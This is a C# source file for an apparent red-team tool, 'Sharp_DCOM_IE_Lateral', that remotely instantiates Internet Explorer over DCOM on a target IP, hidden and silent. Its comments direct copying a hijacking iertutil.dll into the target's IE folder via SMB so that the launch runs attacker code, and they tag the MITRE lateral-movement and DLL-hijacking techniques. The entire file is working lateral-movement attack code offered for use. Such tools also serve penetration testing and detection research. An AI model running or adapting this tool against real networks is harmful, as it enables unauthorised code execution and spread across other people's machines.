using System;
using System.Runtime.InteropServices;

namespace Sharp_DCOM_IE_Lateral
{
    // Remote DCOM - DLL Proxy Hijacking (Internet Explorer) - https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/
    // Copy iertutil.dll c:\Program Files\Internet Explorer\iertutil.dll via SMB.
    // MITRE TTPS: T1021.003, T1574.001, T1021.002

    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0||args == null)
            {
                Console.WriteLine("[-] Sharp_DCOM_IE_Lateral.exe <REMOTE IP ADDRESS>");
            }
            else
            {
                try
                {
                    string hostName;
                    hostName = args[0];                                    // InternetExplorer.Application CLSID
                    Type DCOMServerType = Type.GetTypeFromProgID("InternetExplorer.Application", hostName);
                    object ieObj = Activator.CreateInstance(DCOMServerType);
                    object[] fArray = new object[] { false };
					object[] tArray = new object[] { true };
                    DCOMServerType.InvokeMember("Visible", System.Reflection.BindingFlags.SetProperty, null, ieObj, fArray);
                    DCOMServerType.InvokeMember("Silent", System.Reflection.BindingFlags.SetProperty, null, ieObj, tArray);
                    Console.Error.WriteLine("[+] Remote DCOM Successful Against: " + hostName);
                }
                catch (COMException comError)
                {
                    Console.Error.WriteLine("[-] DCOM Error: " + comError.Message);
                }
                catch (System.UnauthorizedAccessException comAccessErr)
                {
                    Console.Error.WriteLine("[-] DCOM Error: Access Denied! Check Credentials! \n");
                    Console.Error.WriteLine("[-] DCOM Error: " + comAccessErr.Message);
                }
            }
        }
    }
}
